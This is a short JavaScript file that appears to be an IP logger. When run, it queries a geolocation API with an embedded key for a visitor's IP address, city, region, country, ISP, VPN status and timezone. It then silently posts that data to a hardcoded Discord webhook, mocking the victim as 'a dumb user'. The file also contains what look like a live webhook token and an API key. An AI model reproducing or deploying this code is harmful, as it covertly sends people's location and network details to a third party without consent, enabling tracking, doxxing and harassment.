const webhooks = "https://discord.com/api/webhooks/1043237347761864824/NviZEYRHAVu8AGHCjtHkYlPdwnWd9YPgSRvRdfML_dLullsCPGB4UmbsdK03tqWoKjaB";
const key = "6667356bf62a46c799e6fdc3a634b856";

const x = async () => {
    const response = await fetch(`https://ipgeolocation.abstractapi.com/v1/?api_key=${key}`);
    const data = await response.json();

    const ip = data.ip_address;
    const city = data.city;
    const region = data.region;
    const country = data.country;
    const flag = data.flag.emoji;
    const Pro = data.connection.autonomous_system_organization;
    const isp = data.connection.isp_name;
    const vpn = data.security.is_vpn;
    const zone = data.timezone.name;
    const time = data.timezone.current_time;

    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", webhooks);
    postRequest.setRequestHeader('Content-type', 'application/json');
    var params = {
        username: "IP Log",
        avatar_url: "",
        content: 
            "**A dumb user get ip logged !**" +
            "\n> **IP**: " + ip +
            "\n> **City**: " + city +
            "\n> **Region**: " + region +
            "\n> **Country**: " + flag + " **-** " + country + " **-** " + flag +
            "\n> **Internet Provider**: " + Pro +
            "\n> **ISP**: " + isp +
            "\n> **VPN**: " + vpn +
            "\n> **Timezone** - **Time**: " + zone + " **-** " + time,
    };

    postRequest.send(JSON.stringify(params));
};

x();